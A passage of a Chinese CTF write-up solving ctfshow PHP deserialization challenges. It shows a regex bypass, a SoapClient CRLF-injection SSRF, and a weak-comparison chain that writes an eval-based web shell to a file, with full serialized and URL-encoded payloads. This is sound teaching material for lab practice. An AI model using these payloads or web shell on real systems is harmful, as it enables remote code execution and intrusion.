class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>在上一题的基础上对输入做了正则过滤`'/[oc]:\d+:/i'`，并且将所以属性设置为公有![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web258-1.png)在数字前添加`+`号可以绕过![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web258-2.png)<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;backDoor&#x27;</span>;<span class="comment">//只能为public</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;<span class="comment">//只能为public</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>序列化结果<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;cat flag.php&quot;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>在数字前插入`+`号，记得`url`编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system(%22cat%20flag.php%22)%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>### web259（SoapClient特殊）本题与其他题目稍有不一样，可以看合天的文章学习`https://zhuanlan.zhihu.com/p/80918004`**SoapClient**> SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用 __call 方法下面编写一个demo，调用不存在的方法，使`SoapClient`类去调用`__call`方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>)); <span class="comment">//实例化对象</span></span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>); <span class="comment">//序列化对象</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);  <span class="comment">//反序列化对象数据</span></span><br><span class="line">    <span class="variable">$c</span>-&gt;test();  <span class="comment">//对象调用不存在的test()方法</span></span><br></pre></td></tr></table></figure>运行![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-1.png)监听![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-2.png)**CRLF漏洞**> CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS在上面的图中，我们可以看到，`SOAPAction`是可控的点，我们注入两个`\r\n`来控制POST请求头<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;aaa\r\n\r\nbbb\r\n&quot;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$c</span>-&gt;test();</span><br></pre></td></tr></table></figure>运行，监听![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-4.png)![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-3.png)CRLF的效果出现了但还有一个问题需要解决，POST数据指定请求头为`Content-Type:application/x-www-form-urlencoded`，我们需要控制`Content-Type`，但从上图中可以发现它位于`SOAPAtion`上方。继续往上，可以发现`User-Agent`位于`Content-Type`上方，这个位置也可以进行注入，所以我们再`User-Agent`进行注入<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$post_string</span> = <span class="string">&quot;test=flagflag&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;Firefox\r\nContent-Type:application/x-www-form-urlencoded\r\n&quot;</span>.<span class="string">&quot;Content-Length: &quot;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$c</span>-&gt;test();</span><br></pre></td></tr></table></figure>运行，监听![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-5.png)![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-6.png)如图，构造任意post请求成功！到此，一系列流程都弄懂后，我们回到题目本身**flag.php**<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>**index.php**<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure>相关参数都给足了，利用ssrf访问flag.php，然后构造post数据`token=ctfshow`还有xff请求头，paylaod如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&quot;token=ctfshow&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;test\r\nContent-Type:application/x-www-form-urlencoded\r\n&quot;</span>.<span class="string">&quot;X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n&quot;</span>.<span class="string">&quot;Content-Length: &quot;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>这里`X-Forwarded-For`里面需要两个`127.0.0.1`的原因是docker环境cloudfare代理所导致，具体可参考这篇文章：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://support.cloudflare.com/hc/zh-cn/articles/200170986-Cloudflare-%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86-HTTP-%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4-</span><br></pre></td></tr></table></figure>运行php![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-7.png)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22aaa%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A127%3A%22test%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>使用get方式以vip参数传入![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-8.png)随后访问`flag.txt`即可得到flag![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web259-9.png)### web260<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>如果`ctfshow`参数是`ctfshow_i_love_36D`就打印，水题？？？![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web260.png)### web261<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="keyword">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;  <span class="comment">//0x36d 十进制是877，弱比较</span></span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>观察代码，可以发现`__invoke`有命令执行，`__destruct`有文件写入；注意到有一个`__unserialize`魔术方法![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web261-1.png)显然> 如果 `__unserialize()` 和 `__wakeup()`两个魔术方法都定义在同一个对象中， 则只有 `__unserialize()` 方法会生效，`__wakeup()` 方法会被忽略。所以我们只用观察`__unserialize`魔术方法，可以发现将传进的`username`和`password`会拼接到`code`中，而在`__destruct`中会判断`code`，接着写入文件很明显这里是一个弱比较，直接构造payload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web561.php</span></span><br><span class="line"><span class="comment">#time: 2023/11/2 14:22</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php @eval($_POST[test]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowvip();</span><br><span class="line">    <span class="keyword">echo</span> (serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>传入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A28%3A%22%3C%3Fphp%20%40eval(%24_POST%5Btest%5D)%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>随后访问`887.php`文件执行命令![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web261.png)### web262(cookie反序列化字符串逃逸)<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>南神说本题考的是一个简单的反序列化字符串逃逸，在看题之前，我们简单了解一下知识点，我们先看一段代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span> = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>结果是<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(67) 